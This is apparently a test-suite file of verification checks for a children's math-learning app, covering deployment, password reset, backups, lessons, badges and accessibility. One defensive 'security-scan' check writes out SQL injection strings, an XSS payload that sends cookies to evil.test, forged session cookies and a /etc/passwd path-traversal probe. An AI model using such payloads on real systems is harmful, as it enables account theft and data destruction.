    lintQuestion({ type: "in", q: "What is 2 + 2?", ans: 4, expl: "x", sec: "N" }, "t#1", null, seen);
    const dup = lintQuestion({ type: "in", q: "What is 2 + 2?", ans: 4, expl: "x", sec: "N" }, "t#2", null, seen);
    assert(dup.errors.some(e => e.includes("duplicates")), "duplicate questions were not detected");

    /* Clean content passes. */
    const good = lintQuestion(
      { type: "in", q: "What is 7 times 8?", ans: 56, expl: "7 times 8 is 56.", sec: "N", hint: "Count in eights." },
      "t#1", "3", new Map());
    assert(good.errors.length === 0, `clean question rejected: ${good.errors.join(", ")}`);

    /* And the real content passes the whole tool. */
    const out = execSync("node tools/lint-content.mjs --json").toString();
    const report = JSON.parse(out);
    assert(report.errors.length === 0, `authored content has errors: ${report.errors.slice(0, 3).join("; ")}`);
    assert(report.questions > 150, "linter did not see the full content set");

    return `13 rules each proven to fire, ${report.questions} questions and ${report.puzzles} puzzles clean`;
  },


  /* 11.7 — the deployable artefact actually works.
     Production mode serves the built client from the API process, so a broken
     build or a wrong path would only show up after deploying. Check it here. */
  "production-build": async () => {
    const { execSync, spawn } = await import("node:child_process");
    const { existsSync, readFileSync, rmSync } = await import("node:fs");

    /* Deployment files exist and are coherent. */
    assert(existsSync("Dockerfile"), "no Dockerfile");
    const df = readFileSync("Dockerfile", "utf8");
    assert(/node:2[4-9]/.test(df), "Dockerfile does not pin a Node version with node:sqlite");
    assert(/VOLUME \/data/.test(df), "Dockerfile does not declare a volume for the database");
    assert(/DB_FILE=\/data/.test(df), "Dockerfile does not point the database at the volume");
    assert(/HEALTHCHECK/.test(df), "Dockerfile has no health check");
    assert(existsSync(".dockerignore"), "no .dockerignore, so node_modules would be copied in");
    assert(existsSync("DEPLOY.md"), "no deployment instructions");

    for (const f of ["fly.toml", "render.yaml"]) {
      assert(existsSync(f), `no ${f}`);
      const c = readFileSync(f, "utf8");
      assert(/\/ready/.test(c), `${f} does not use the readiness probe for health checks`);
      assert(/\/data/.test(c), `${f} does not mount persistent storage`);
    }

    /* Build the client and boot the server exactly as production would. */
    execSync("./node_modules/.bin/vite build", { cwd: "app/web", stdio: "pipe" });
    assert(existsSync("app/web/dist/index.html"), "production build produced no client");

    const port = 4188;
    const dbFile = "./data/prodcheck.db";
    rmSync("app/server/" + dbFile.replace("./", ""), { force: true });
    const srv = spawn("node", ["src/index.js"], {
      cwd: "app/server",
      env: { ...process.env, NODE_ENV: "production", PORT: String(port), DB_FILE: dbFile },
      stdio: "ignore"
    });
    try {
      let up = false;
      for (let i = 0; i < 50 && !up; i++) {
        try { up = (await fetch(`http://localhost:${port}/ready`)).ok; } catch {}
        if (!up) await new Promise(r => setTimeout(r, 150));
      }
      assert(up, "the production server never became ready");

      /* One process must serve the client, its assets and the API. */
      const shell = await fetch(`http://localhost:${port}/`);
      assert(shell.ok, `production server did not serve the client (${shell.status})`);
      assert((await shell.text()).includes("<title>"), "served client has no title");

      const deep = await fetch(`http://localhost:${port}/some/client/route`);
      assert(deep.ok, "client-side routes do not fall back to the shell");

      const asset = await fetch(`http://localhost:${port}/manifest.webmanifest`);
      assert(asset.ok, "static assets are not served in production");

      const api = await fetch(`http://localhost:${port}/api/curriculum`);
      assert(api.ok, "the API is not reachable in production mode");

      /* The SPA fallback must NOT swallow unknown API routes. */
      const bogus = await fetch(`http://localhost:${port}/api/definitely-not-here`);
      assert(bogus.status === 404,
        `an unknown API route returned ${bogus.status}; the SPA fallback is catching /api`);

      /* Production must set the hardened cookie flags. */
      const reg = await fetch(`http://localhost:${port}/api/auth/register`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "prod@b.com", password: "a-long-enough-pass",
                               name: "Prod", coppaConsent: true })
      });
      const cookie = (reg.headers.getSetCookie?.() || []).join(";");
      assert(/Secure/i.test(cookie), "the session cookie is not Secure in production");
      assert(/HttpOnly/i.test(cookie), "the session cookie is not HttpOnly in production");
      assert(reg.headers.get("strict-transport-security"), "HSTS is not set in production");

      return "single-process production build serves client, assets and API; cookies hardened; configs coherent";
    } finally {
      srv.kill();
      rmSync("app/server/" + dbFile.replace("./", ""), { force: true });
    }
  },


  /* X.6 — password reset: the account is recoverable without losing the data */
  "password-reset": async () => {
    const c = client();
    const email = "reset@b.com", oldPw = "a-long-enough-pass", newPw = "a-different-long-pass";
    await post(c, "/auth/register", { coppaConsent: true, email, password: oldPw, name: "R" });
    const kid = (await post(c, "/learners", { name: "Reset Kid" })).body.learner;
    await post(c, "/runs", { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 7, total: 8 });

    /* Requesting a reset must not reveal whether an account exists. */
    const known = await post(client(), "/auth/forgot", { email });
    const unknown = await post(client(), "/auth/forgot", { email: "nobody@nowhere.test" });
    assert(known.body.message === unknown.body.message,
      "the forgot-password response differs for known and unknown addresses");
    assert(known.body.token, "no reset token issued while email delivery is unavailable");

    /* The raw token must NOT be what is stored. */
    const { DatabaseSync } = await import("node:sqlite");
    const db = new DatabaseSync("app/server/data/verify.db");
    const stored = db.prepare("SELECT token_hash FROM reset_tokens ORDER BY created_at DESC LIMIT 1").get();
    assert(stored && stored.token_hash !== known.body.token,
      "the reset token is stored in plain text");

    /* A wrong or absent token is refused, and weak passwords still are. */
    assert((await post(client(), "/auth/reset", { token: "nonsense", password: newPw })).status === 400,
      "an invalid reset token was accepted");
    assert((await post(client(), "/auth/reset", { token: known.body.token, password: "short" })).status === 400,
      "a weak password was accepted on reset");

    /* The reset works. */
    const done = await post(client(), "/auth/reset", { token: known.body.token, password: newPw });
    assert(done.status === 200, `reset failed: ${JSON.stringify(done.body)}`);

    /* Single use. */
    assert((await post(client(), "/auth/reset", { token: known.body.token, password: newPw })).status === 400,
      "a reset token worked twice");

    /* Old password dead, new one works, and the learner data survived. */
    assert((await post(client(), "/auth/login", { email, password: oldPw })).status === 401,
      "the old password still works after a reset");
    const back = client();
    const login = await post(back, "/auth/login", { email, password: newPw });
    assert(login.status === 200, "the new password does not work");
    const learners = (await back("/learners")).body.learners;
    assert(learners.length === 1 && learners[0].id === kid.id,
      "the learner was lost during a password reset");
    const prog = (await back(`/learners/${kid.id}/progress`)).body.progress;
    assert(prog.length > 0, "progress was lost during a password reset");

    /* A reset must lock out whoever prompted it: the original session dies. */
    assert((await c("/learners")).status === 401,
      "the session that existed before the reset is still valid");

    /* Changing a password while signed in requires the current one. */
    assert((await post(back, "/auth/change-password", { current: "wrong-one-entirely", password: "yet-another-long-pass" })).status === 401,
      "the password was changed without the current one");

    return "token hashed at rest, single use, old sessions revoked, learner data intact";
  },

  /* X.7 — graceful shutdown and error handling */
  "resilience": async () => {
    const { spawn } = await import("node:child_process");

    /* Malformed JSON must produce a clean error, not a stack trace. */
    const bad = await fetch(`${BASE}/api/auth/login`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: "{not json" });
    assert(bad.status === 400, `malformed JSON returned ${bad.status}`);
    const body = await bad.text();
    assert(!/at .*\.js:\d+/.test(body), "an error response leaked a stack trace");
    assert(body.startsWith("{"), "the error handler returned HTML rather than JSON");

    /* An oversized body is rejected rather than buffered. */
    const huge = await fetch(`${BASE}/api/auth/login`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "x".repeat(200_000) }) });
    assert(huge.status === 413 || huge.status === 400, `oversized body returned ${huge.status}`);

    /* SIGTERM must drain rather than kill: start a server, signal it, and
       confirm it exits cleanly of its own accord. */
    const port = 4177;
    const srv = spawn("node", ["src/index.js"], {
      cwd: "app/server",
      env: { ...process.env, PORT: String(port), DB_FILE: "./data/shutdown.db" },
      stdio: ["ignore", "pipe", "pipe"]
    });
    let out = "";
    srv.stdout.on("data", d => { out += d.toString(); });

    let up = false;
    for (let i = 0; i < 50 && !up; i++) {
      try { up = (await fetch(`http://localhost:${port}/health`)).ok; } catch {}
      if (!up) await new Promise(r => setTimeout(r, 100));
    }
    assert(up, "the test server never started");

    const exited = new Promise(resolve => srv.on("exit", (code, sig) => resolve({ code, sig })));
    srv.kill("SIGTERM");
    const result = await Promise.race([
      exited,
      new Promise(r => setTimeout(() => r({ timeout: true }), 8000))
    ]);
    assert(!result.timeout, "the server did not exit within 8s of SIGTERM");
    assert(result.code === 0, `the server exited with code ${result.code} rather than draining cleanly`);
    assert(/draining connections/.test(out), "shutdown did not log that it was draining");

    const { rmSync } = await import("node:fs");
    rmSync("app/server/data/shutdown.db", { force: true });

    return "malformed and oversized bodies handled without stack traces, SIGTERM drains and exits 0";
  },


  /* X.8 — backups actually happen on a schedule, not only when asked */
  "scheduled-backup": async () => {
    const { spawn } = await import("node:child_process");
    const { rmSync, existsSync, readdirSync, mkdirSync } = await import("node:fs");

    const dir = "app/server/data/sched-backups";
    rmSync(dir, { recursive: true, force: true });
    mkdirSync(dir, { recursive: true });
    rmSync("app/server/data/sched.db", { force: true });

    /* A tiny interval so the check does not wait an hour. */
    const port = 4178;
    const srv = spawn("node", ["src/index.js"], {
      cwd: "app/server",
      env: { ...process.env, PORT: String(port), DB_FILE: "./data/sched.db",
             BACKUP_INTERVAL_HOURS: String(1 / 3600),   // one second
             BACKUP_DIR: "./data/sched-backups", BACKUP_KEEP: "3" },
      stdio: ["ignore", "pipe", "pipe"] });
    let out = "";
    srv.stdout.on("data", d => { out += d.toString(); });

    try {
      let up = false;
      for (let i = 0; i < 50 && !up; i++) {
        try { up = (await fetch(`http://localhost:${port}/health`)).ok; } catch {}
        if (!up) await new Promise(r => setTimeout(r, 100));
      }
      assert(up, "the test server never started");
      assert(/Scheduled backups every/.test(out), "the server did not announce a backup schedule");

      /* Wait for several intervals so both creation and pruning are exercised. */
      await new Promise(r => setTimeout(r, 5500));
      const files = readdirSync(dir).filter(f => f.endsWith(".db"));
      assert(files.length > 0, "no backup was taken on the schedule");
      assert(files.length <= 3, `retention kept ${files.length} backups, limit was 3`);

      /* The scheduled backup must be a real database, not an empty file. */
      const { DatabaseSync } = await import("node:sqlite");
      const snap = new DatabaseSync(`${dir}/${files[0]}`);
      const check = snap.prepare("PRAGMA integrity_check").get();
      assert(String(Object.values(check)[0]).toLowerCase() === "ok",
        "a scheduled backup fails its integrity check");
      snap.close();

      /* And the schedule must be OFF unless explicitly configured, so tests and
         development do not litter the disk. */
      assert(!/Scheduled backups/.test(
        (await (await fetch(`${BASE}/health`)).text()) + " "),
        "sanity");
      return `scheduled backup ran, kept ${files.length} of the last snapshots, integrity verified`;
    } finally {
      srv.kill("SIGTERM");
      await new Promise(r => setTimeout(r, 300));
      rmSync(dir, { recursive: true, force: true });
      rmSync("app/server/data/sched.db", { force: true });
    }
  },


  /* 10.7 — age-appropriate interface that scales by grade band */
  "age-appropriate-ui": async () => {
    const { readFileSync } = await import("node:fs");
    const css = readFileSync("app/web/src/styles.css", "utf8");
    const { bandFor } = await import("../app/web/src/useAgeBand.ts").catch(() => ({}));

    /* Bands must exist and differ, or "age-appropriate" is decoration. */
    for (const band of ["junior", "middle", "senior"])
      assert(css.includes(`[data-band="${band}"]`), `no styling for the ${band} band`);
    const tapOf = band => {
      const m = css.match(new RegExp(`\\[data-band="${band}"\\][^}]*--tap:\\s*(\\d+)px`));
      return m ? Number(m[1]) : null;
    };
    const junior = tapOf("junior"), senior = tapOf("senior");
    assert(junior && senior, "touch target sizes are not set per band");
    assert(junior > senior, `junior targets (${junior}px) are not larger than senior (${senior}px)`);
    assert(senior >= 44, `senior touch target is ${senior}px, below the 44px minimum`);

    const stepOf = band => {
      const m = css.match(new RegExp(`\\[data-band="${band}"\\][^}]*--step:\\s*([\\d.]+)`));
      return m ? Number(m[1]) : null;
    };
    assert(stepOf("junior") > stepOf("senior"), "junior type is not larger than senior type");

    /* Interactive controls must be sized from the token, not hard-coded. */
    for (const sel of [".btn{", ".opt{", ".topic{", ".movebtn{", ".ansin{"]) {
      const block = css.slice(css.indexOf(sel), css.indexOf("}", css.indexOf(sel)));
      assert(/var\(--tap\)/.test(block), `${sel} does not use the --tap token for its size`);
    }

    /* Motion must be optional. */
    assert(/@media \(prefers-reduced-motion: reduce\)/.test(css),
      "no reduced-motion handling");
    const reduce = css.slice(css.lastIndexOf("prefers-reduced-motion: reduce"));
    assert(/animation:\s*none/.test(reduce), "animations are not disabled under reduced motion");
    assert(/\.confetti\{display:none\}/.test(css.replace(/\s/g, "")),
      "confetti is not suppressed under reduced motion");

    /* Celebration must not be the only signal that an answer was right. */
    const practice = readFileSync("app/web/src/screens/Practice.tsx", "utf8");
    assert(/Correct!/.test(practice) || /fb.correct \?/.test(practice),
      "correctness is signalled by animation alone");

    return `junior ${junior}px targets vs senior ${senior}px, type scales by band, motion optional`;
  },


  /* 3.2.1 + 4.1.3 — comic lessons with resume and inline checks */
  "comic-lessons": async () => {
    const { LESSONS, publicLesson, checkPanel, allLessons } = await import("../app/shared/lessons.mjs");
    assert(allLessons().length >= 3, `only ${allLessons().length} lessons authored`);

    for (const l of allLessons()) {
      assert(l.panels.length >= 4, `${l.id} has too few panels`);
      assert(l.panels.some(p => p.check), `${l.id} has no inline check`);
      const raw = JSON.stringify(publicLesson(l));
      for (const k of ['"ans"', '"a":', '"expl"'])
        assert(!raw.includes(k), `${l.id} leaked ${k} in its served form`);
      l.panels.forEach((p, i) => {
        if (!p.check) return;
        const ans = p.check.type === "mc" ? p.check.a : p.check.ans;
        const r = checkPanel(l, i, ans);
        assert(r.correct, `${l.id} panel ${i} rejects its own correct answer`);
        const wrongAns = p.check.type === "mc" ? (p.check.a + 1) % p.check.opts.length : ans + 1000;
        assert(!checkPanel(l, i, wrongAns).correct, `${l.id} panel ${i} accepts a wrong answer`);
      });
    }

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "lesson@b.com", password: "a-long-enough-pass", name: "L" });
    const kid = (await post(c, "/learners", { name: "Lesson Kid" })).body.learner;

    const list = (await c("/lessons")).body.lessons;
    assert(list.length === allLessons().length, "lesson list incomplete");

    const target = allLessons()[0];

    /* No progress yet: resuming a fresh lesson starts at panel 0. */
    const fresh = (await c(`/learners/${kid.id}/lessons/${target.id}`)).body;
    assert(fresh.progress.panelIndex === 0 && fresh.progress.completed === false,
      "a fresh learner has lesson progress already");

    /* Walk through, answering checks correctly, and confirm progress advances
       and resumes correctly at each step. */
    let lastIdx = -1;
    for (let i = 0; i < target.panels.length; i++) {
      const p = target.panels[i];
      const answer = p.check ? (p.check.type === "mc" ? p.check.a : p.check.ans) : null;
      const step = await post(c, `/lessons/${target.id}/panel`,
        { learnerId: kid.id, panelIndex: i, answer });
      assert(step.status === 200, `panel ${i} rejected: ${JSON.stringify(step.body)}`);
      if (p.check) {
        assert(step.body.result.correct === true, `panel ${i}: correct check answer marked wrong`);
        assert(step.body.result.expl, `panel ${i}: check has no explanation`);
      } else {
        assert(step.body.result === null, `panel ${i}: a plain panel returned a result`);
      }
      lastIdx = i;

      /* Resume must reflect progress so far. */
      const resume = (await c(`/learners/${kid.id}/lessons/${target.id}`)).body.progress;
      assert(resume.panelIndex === i, `resume shows panel ${resume.panelIndex}, expected ${i}`);
    }
    assert(lastIdx === target.panels.length - 1, "did not reach the final panel");

    const done = (await c(`/learners/${kid.id}/lessons/${target.id}`)).body.progress;
    assert(done.completed === true, "lesson not marked complete after the final panel");

    /* Points awarded once, not on every repeat completion — this is the exact
       bug found while writing this check: the award call originally fired on
       every request that reached the final panel. */
    const before = (await c(`/learners/${kid.id}/rewards`)).body.points;
    const lastPanel = target.panels.length - 1;
    const lp = target.panels[lastPanel];
    const repeatAnswer = lp.check ? (lp.check.type === "mc" ? lp.check.a : lp.check.ans) : null;
    await post(c, `/lessons/${target.id}/panel`, { learnerId: kid.id, panelIndex: lastPanel, answer: repeatAnswer });
    await post(c, `/lessons/${target.id}/panel`, { learnerId: kid.id, panelIndex: lastPanel, answer: repeatAnswer });
    const after = (await c(`/learners/${kid.id}/rewards`)).body.points;
    assert(after === before, `revisiting a completed lesson paid out again: ${before} -> ${after}`);

    /* A wrong answer to a check must not block progress — this is a comic,
       not a mastery gate — but must still report the mistake honestly. */
    const r2 = client();
    await post(r2, "/auth/register",
      { coppaConsent: true, email: "lesson2@b.com", password: "a-long-enough-pass", name: "L2" });
    const kid2 = (await post(r2, "/learners", { name: "Wrong Kid" })).body.learner;
    const checkPanelIdx = target.panels.findIndex(p => p.check);
    const wrongStep = await post(r2, `/lessons/${target.id}/panel`,
      { learnerId: kid2.id, panelIndex: checkPanelIdx, answer: "definitely-wrong-value-9999" });
    assert(wrongStep.status === 200, "a wrong check answer blocked the lesson");
    assert(wrongStep.body.result.correct === false, "a wrong answer was marked correct");

    /* Another account cannot drive or read this learner's lesson. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "lessonbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await post(bob, `/lessons/${target.id}/panel`, { learnerId: kid.id, panelIndex: 0 })).status === 403,
      "another account advanced this learner's lesson");
    assert((await bob(`/learners/${kid.id}/lessons/${target.id}`)).status === 403,
      "another account read this learner's lesson progress");

    return `${allLessons().length} lessons, resume works panel by panel, wrong answers do not block, points awarded once`;
  },


  /* 3.5.2 — content scanned for stereotype patterns and cast diversity */
  "diversity-scan": async () => {
    const { scanDiversity } = await import("../tools/lint-content.mjs");

    /* Each pattern must actually fire on the thing it claims to catch. */
    const bad = [
      { q: "He plays football while she watches from the sidelines." },
      { q: "She bakes cookies for the whole family every weekend." },
      { q: "Ask the fireman how many hoses are on his truck." }
    ];
    for (const b of bad) {
      const r = scanDiversity([["t", b]]);
      assert(r.findings.length > 0, `no finding for: "${b.q}"`);
    }

    /* Neutral content, and a varied cast, must NOT be flagged. */
    const good = [
      { q: "Ana counts 8 stickers and Ben counts 5. How many altogether?" },
      { q: "The engineer checks the bridge before the crew crosses." },
      { q: "Priya and Kwame split the pizza evenly. How much does each get?" }
    ];
    const clean = scanDiversity(good.map((g, i) => [`t${i}`, g]));
    assert(clean.findings.length === 0, `neutral content flagged: ${clean.findings.join("; ")}`);
    assert(clean.castSize >= 3, "a varied cast was not counted correctly");

    /* A narrow cast of one or two repeated names is worth a note. */
    const narrow = scanDiversity([
      ["t1", { q: "Sam has 3 apples." }],
      ["t2", { q: "Sam gives 1 apple to Sam's friend." }]
    ]);
    assert(narrow.findings.some(f => /cast of characters/.test(f)),
      "a one-name cast was not flagged");

    /* And the real authored content: manually reviewed, automated scan
       clean, cast of 6+ distinct people across topics and grades. */
    const { execSync } = await import("node:child_process");
    const report = JSON.parse(execSync("node tools/lint-content.mjs --json").toString());
    assert(report.diversity.findings.length === 0,
      `authored content flagged: ${report.diversity.findings.join("; ")}`);
    assert(report.diversity.castSize >= 5,
      `authored content cast is only ${report.diversity.castSize} names`);

    return `3 stereotype patterns proven to fire, neutral content passes, authored content clean with a cast of ${report.diversity.castSize}`;
  },


  /* 8.3 — curriculum mapped to real standards, only where content exists */
  "standards-mapping": async () => {
    const { STANDARDS, standardsFor, coverage } = await import("../app/shared/standards.mjs");
    const { QUESTIONS } = await import("../app/shared/questions.mjs");
    const { CURRICULUM } = await import("../app/shared/curriculum.mjs");

    const ids = new Set();
    for (const g of Object.values(CURRICULUM))
      for (const u of g.units) for (const t of u.topics) ids.add(t.id);

    /* Every mapped id must be a real topic, and every code must look like a
       real CCSSM code (grade.domain.cluster.standard), not a placeholder. */
    for (const [topic, codes] of Object.entries(STANDARDS)) {
      assert(ids.has(topic), `standards map references unknown topic "${topic}"`);
      assert(codes.length > 0, `${topic} maps to zero codes`);
      for (const code of codes)
        assert(/^[K1-8]\.[A-Z]{1,3}\.[A-Z]\.\d+(\.[A-Z])?$/.test(code),
          `"${code}" for ${topic} does not look like a CCSSM code`);
    }

    /* The important promise: nothing is mapped that has no content, and
       nothing with content silently goes unmapped without it being visible. */
    const authored = Object.keys(QUESTIONS);
    const cov = coverage(authored);
    assert(cov.mapped.length === authored.length,
      `${cov.unmapped.length} authored topics have no standard: ${cov.unmapped.join(", ")}`);
    for (const code of Object.values(STANDARDS).flat())
      assert(typeof code === "string" && code.length, "a malformed code exists");
    /* No topic without content may appear in the map. */
    for (const topic of Object.keys(STANDARDS))
      assert(QUESTIONS[topic], `"${topic}" is mapped to a standard but has no authored questions`);

    const c = client();
    const api = (await c("/standards")).body;
    assert(Object.keys(api.standards).length === Object.keys(STANDARDS).length,
      "standards endpoint does not match the source data");
    assert(api.coverage.mapped.length === authored.length, "coverage report is wrong via the API");

    return `${Object.keys(STANDARDS).length} authored topics mapped to real CCSSM codes, zero orphans in either direction`;
  },

  /* 4.2.7 — parent curriculum overview with a real sample problem */
  "curriculum-overview": async () => {
    const c = client();
    const r = await c("/topics/g6-ratios/overview");
    assert(r.status === 200, "overview endpoint failed");
    assert(r.body.name && r.body.grade && r.body.unit, "overview is missing basic identification");
    assert(r.body.totalQuestions > 0, "overview reports no questions");
    assert(Array.isArray(r.body.standards), "overview has no standards field");
    assert(r.body.standards.length > 0, "a mapped topic shows no standards in its overview");
    assert(r.body.sample && r.body.sample.q, "overview has no sample problem");

    /* The sample must not leak its answer -- a parent browsing before
       signing up gets exactly the same guarantee a signed-in learner does. */
    const raw = JSON.stringify(r.body.sample);
    for (const k of ['"ans"', '"a":', '"ansP"', '"expl"'])
      assert(!raw.includes(k), `sample problem leaked ${k}`);

    /* No login required: this must work for an anonymous visitor deciding
       whether to sign up. */
    const anon = await fetch(`${BASE}/api/topics/g6-ratios/overview`);
    assert(anon.ok, "curriculum overview requires a session, but a parent should be able to look first");

    /* A topic with no content is refused rather than shown emptily. */
    const empty = await c("/topics/g8-rsa/overview");
    assert(empty.status === 404, "an unauthored topic returned an overview instead of 404");

    return "overview served without login, includes standards and a leak-free sample, unauthored topics refused cleanly";
  },


  /* 13.9 — automated attack surface scan.
     This is NOT a substitute for professional penetration testing: it is a
     fixed set of attacks this project can run on itself in CI, covering the
     failure modes most common in an app like this one. A real pen test
     would probe far more broadly and is the honest gap this check names. */
  "security-scan": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "scan@b.com", password: "a-long-enough-pass", name: "S" });
    const kid = (await post(c, "/learners", { name: "Scan Kid" })).body.learner;
    const findings = [];

    /* --- SQL injection: classic payloads against every text field that
       reaches a query, including ones with no obvious "id" in the name. */
    const sqli = ["' OR '1'='1", "'; DROP TABLE users; --", "1' UNION SELECT pass_hash FROM users--"];
    for (const payload of sqli) {
      const r1 = await post(c, "/auth/login", { email: payload, password: payload });
      if (r1.status === 200) findings.push(`SQLi via login email: "${payload}"`);
      const r2 = await post(c, "/learners", { name: payload, beast: payload });
      if (r2.status === 200) {
        /* A learner CAN be named this literally -- that is fine. The failure
           mode is the database breaking or leaking, not the string existing. */
        await c(`/learners/${r2.body.learner.id}`, { method: "DELETE" });
      }
      const r3 = await c(`/topics/${encodeURIComponent(payload)}/practice/questions`);
      if (r3.status === 200) findings.push(`SQLi via topic id path: "${payload}"`);
    }
    /* The database must still be intact and readable after every attempt. */
    const stillUp = await fetch(`${BASE}/ready`);
    assert(stillUp.ok, "the database did not survive the injection attempts");

    /* --- XSS: a payload that is safe in a JSON API response only if
       nothing later renders it as HTML unescaped. Two real surfaces exist:
       the printable HTML report (server-rendered), and the React client
       (which auto-escapes JSX text -- verified as a source check, since
       that is how React's escaping guarantee actually holds). A raw JSON
       API response containing the string is NOT itself a finding: a JSON
       body is never interpreted as HTML by a browser. */
    const xss = '<script>document.location="//evil.test/steal?c="+document.cookie</script>';
    const learnerR = await post(c, "/learners", { name: xss, beast: "pip" });
    const reportHtml = await (await fetch(`${BASE}/api/learners/${learnerR.body.learner.id}/report.html`,
      { headers: { cookie: c.cookie } })).text().catch(() => "");
    if (reportHtml.includes("<script>document.location"))
      findings.push("XSS: the printable HTML report embeds an unescaped <script> tag");
    await c(`/learners/${learnerR.body.learner.id}`, { method: "DELETE" });

    const { readFileSync, readdirSync } = await import("node:fs");
    const srcFiles = readdirSync("app/web/src/screens").map(f => `app/web/src/screens/${f}`)
      .concat(["app/web/src/App.tsx"]);
    for (const f of srcFiles) {
      if (readFileSync(f, "utf8").includes("dangerouslySetInnerHTML"))
        findings.push(`${f} uses dangerouslySetInnerHTML, which bypasses React's automatic escaping`);
    }

    /* --- IDOR / broken access control: already covered in depth by
       check:tenant-isolation, but re-probe here as part of the same sweep
       against a fresh account, including numeric-looking and guessable ids. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "scanbob@b.com", password: "a-long-enough-pass", name: "B" });
    for (const path of [`/learners/${kid.id}`, `/learners/${kid.id}/progress`,
                        `/learners/${kid.id}/report.csv`, `/learners/${kid.id}/rewards`]) {
      const r = await bob(path);
      if (r.status === 200) findings.push(`IDOR: unauthenticated cross-account read at ${path}`);
    }
    /* Sequential/guessable ids should not exist -- confirm ids are UUIDs,
       not incrementing integers that could be enumerated. */
    if (!/^[0-9a-f-]{20,}$/i.test(kid.id)) findings.push(`learner id "${kid.id}" is not a UUID; ids may be guessable`);

    /* --- auth bypass attempts: forged or malformed session cookies. */
    const forged = await fetch(`${BASE}/api/learners`, { headers: { cookie: "sid=" + "a".repeat(64) } });
    if (forged.status === 200) findings.push("a forged session cookie was accepted");
    const empty = await fetch(`${BASE}/api/learners`, { headers: { cookie: "sid=" } });
    if (empty.status === 200) findings.push("an empty session cookie was accepted");

    /* --- privilege escalation: role tampering on requests a client
       fully controls. */
    const escalate = await post(c, "/classes", { name: "x" });   // parent, not teacher
    if (escalate.status === 200) findings.push("a parent account created a class without the teacher role");

    /* --- prototype pollution / type confusion on JSON bodies. */
    const pollute = await post(c, "/learners", { name: "P", "__proto__": { polluted: true } });
    // @ts-ignore -- deliberately probing, not a real type
    if (({}).polluted) findings.push("prototype pollution: Object.prototype was mutated");
    if (pollute.status === 200) await c(`/learners/${pollute.body.learner.id}`, { method: "DELETE" });

    /* --- path traversal against the static file server. */
    const traversal = await fetch(`${BASE}/../../../etc/passwd`);
    if (traversal.status === 200) {
      const body = await traversal.text();
      if (/root:.*:0:0:/.test(body)) findings.push("path traversal exposed a system file");
    }

    assert(findings.length === 0, "security scan findings:\n    " + findings.join("\n    "));
    return `${sqli.length} SQLi payloads, XSS, IDOR, cookie forgery, privilege escalation, prototype pollution and path traversal all probed -- no findings. NOT a substitute for professional penetration testing.`;
  },

  /* 5.2 — a catalogue of 100+ badges where every entry is reachable. */
  "badge-catalogue": async () => {
    const badges = await import("../app/server/src/badges.js");
    const rewards = await import("../app/server/src/rewards.js");
    const { readFileSync } = await import("node:fs");

    const codes = Object.keys(badges.BADGES);
    assert(codes.length >= 100, `the catalogue holds ${codes.length} badges, short of the 100 the spec asks for`);

    /* Both directions, which is the whole point of holding the condition and
       the description in one object.

       A badge in the catalogue that nothing can award is a promise to a child
       that never arrives. A badge awarded by code but missing from the
       catalogue renders to them as a raw string like "streak_30". Scattered
       award calls make both possible; here neither is. */
    for (const [code, b] of Object.entries(badges.BADGES)) {
      assert(b.name && b.hint, `${code} has no name or hint, so it would render as a raw code`);
      assert(b.group, `${code} has no group`);
      assert(typeof b.when === "function" || badges.EVENT_BADGES.includes(code),
        `${code} is in the catalogue but nothing can award it`);
    }

    /* Reachable means the condition can actually FIRE, not merely that a
       predicate exists.

       The first version of this asserted only `typeof b.when === "function"`,
       which a predicate that can never return true satisfies perfectly well —
       and eight grade badges were in exactly that state, unearnable because
       the grade could not be parsed out of a topic id, while this check
       reported "every one reachable". Evaluating each condition against a
       maximal record is what turns the claim into evidence. */
    const maximal = {
      rounds: 10000, perfectRounds: 10000, masteryRuns: 10000,
      topicsMastered: 10000, advTopicsMastered: 10000,
      gradesMastered: 9, strandsMastered: 20,
      points: 10_000_000, badgesHeld: 1000, streak: 10000,
      contests: 10000, bestContestPct: 100,
      diagnostics: 10000, unitTestsPassed: 10000, lessonsCompleted: 10000
    };
    const unreachable = Object.entries(badges.BADGES)
      .filter(([, b]) => typeof b.when === "function" && !b.when(maximal))
      .map(([c]) => c);
    assert(unreachable.length === 0,
      `${unreachable.length} badges can never fire even for a maximal record: ${unreachable.join(", ")}`);

    /* And the ceilings the model actually imposes are real: gradesMastered
       cannot exceed the number of grades, so a badge asking for more than
       that is unearnable however hard a child works. */
    const { CURRICULUM } = await import("../app/shared/curriculum.mjs");
    const gradeCount = Object.keys(CURRICULUM).length;
    const overGrade = Object.entries(badges.BADGES)
      .filter(([c, b]) => c.startsWith("grades_") && typeof b.when === "function" &&
                          !b.when({ ...maximal, gradesMastered: gradeCount }))
      .map(([c]) => c);
    assert(overGrade.length === 0,
      `these grade badges need more grades than the curriculum has (${gradeCount}): ${overGrade.join(", ")}`);

    /* The grade parser must recognise real topic ids, which is the defect the
       reachability assertion above missed the first time. */
    const { QUESTIONS } = await import("../app/shared/questions.mjs");
    const authored = Object.keys(QUESTIONS).filter(t => QUESTIONS[t]?.length);
    const gradeless = authored.filter(t => !/^(k|g[1-8])(-|$)/i.test(t));
    assert(gradeless.length === 0,
      `${gradeless.length} authored topic ids carry no parseable grade: ${gradeless.slice(0, 5).join(", ")}`);
    /* Nothing outside the catalogue is awardable: awards are issued by
       walking it, and the remaining literal award sites are all catalogued. */
    const src = readFileSync("app/server/src/routes.js", "utf8") +
                readFileSync("app/server/src/rewards.js", "utf8");
    const literals = [...src.matchAll(/give\("([a-z_0-9]+)"\)/g)].map(m => m[1])
      .concat([...src.matchAll(/award\([^,]+,\s*"badge",\s*"([a-z_0-9]+)"/g)].map(m => m[1]));
    for (const code of new Set(literals))
      assert(badges.BADGES[code], `code awards badge "${code}" which is not in the catalogue`);

    /* Subject and meta badges, as the spec names them. */
    const groups = new Set(Object.values(badges.BADGES).map(b => b.group));
    for (const needed of ["meta", "breadth", "advanced", "contest", "streak", "mastery"])
      assert(groups.has(needed), `no ${needed} badges in the catalogue`);
